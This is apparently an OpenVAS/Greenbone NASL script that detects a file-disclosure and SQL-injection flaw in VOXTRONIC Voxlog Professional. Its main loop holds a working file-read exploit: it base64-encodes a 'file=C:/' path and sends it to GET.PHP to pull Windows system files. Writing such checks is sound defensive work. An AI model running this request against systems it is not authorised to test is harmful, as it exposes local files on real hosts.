if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103430" );
	script_bugtraq_id( 52081 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "VOXTRONIC Voxlog Professional Multiple Security Vulnerabilities" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-02-20 14:56:07 +0100 (Mon, 20 Feb 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_mandatory_keys( "Host/runs_windows" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52081" );
	script_xref( name: "URL", value: "http://www.voxtronic.com/" );
	script_tag( name: "summary", value: "VOXTRONIC Voxlog Professional is prone to a file-disclosure
  vulnerability and multiple SQL-injection vulnerabilities because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An remote attacker can exploit these issues to obtain potentially
  sensitive information from local files on computers running the vulnerable application, or modify
  the logic of SQL queries. A successful exploit may allow the attacker to compromise the software,
  retrieve information, or modify data. This may aid in further attacks." );
	script_tag( name: "affected", value: "VOXTRONIC Voxlog Professional 3.7.2.729 and 3.7.0.633 are vulnerable.
  Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files( "Windows" );
for dir in make_list( "/voxlog",
	 "/voxalert" ) {
	url = dir + "/oben.php";
	if(http_vuln_check( port: port, url: url, pattern: "<title>(voxLog|voxAlert)", usecache: TRUE )){
		for pattern in keys( files ) {
			file = files[pattern];
			file = "file=C:/" + file;
			file = base64( str: file );
			url = dir + "/GET.PHP?v=" + file;
			if(http_vuln_check( port: port, url: url, pattern: pattern )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 0 );

